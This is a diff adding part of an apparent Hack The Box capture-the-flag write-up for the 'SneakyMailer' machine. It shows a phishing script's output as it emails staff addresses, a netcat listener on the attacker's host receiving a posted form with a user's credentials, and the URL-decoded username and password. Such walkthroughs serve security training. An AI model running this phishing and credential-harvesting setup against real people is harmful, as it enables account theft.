@@ -161,12 +161,49 @@ Nmap done: 1 IP address (1 host up) scanned in 1080.13 sec</pre>
 </span>        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
 </pre>
 
-  
+<blockquote><p>Result after running the script</p></blockquote>
+<pre>➜  sneakymailer python spoof-msg.py                                                    
+
+<span class="o">[</span>+]Sending email to airisatou@sneakymailer.htb
+
+<span class="o">[</span>+]Sending email to angelicaramos@sneakymailer.htb
+
+<span class="o">[</span>+]Sending email to ashtoncox@sneakymailer.htb
+
+<span class="o">[</span>+]Sending email to bradleygreer@sneakymailer.htb
+</pre>  
  
+<blockquote><p>The response on listener</p></blockquote>  
+<pre><span class="err">➜  m19o nc -nlvp 8080 
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::8080
+Ncat: Listening on 0.0.0.0:8080
+Ncat: Connection from 10.10.10.197.
+Ncat: Connection from 10.10.10.197:48426.
+</span><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.14.24:8080</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">python-requests/2.23.0</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">185</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+
+firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
+</pre>
   
+<blockquote><p>So we found user : paulbyrd and the password we need to decode it</p>
+<p>Result after decoding</p>
+</blockquote>
+<pre>firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
+</pre>  
   
+<blockquote><p>So we Got</p>
+<p>mail: paulbyrd@sneakymailer.htb
+user: paulbyrd
+password: ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht</p>
   
-  
+</blockquote>  
   
   
   
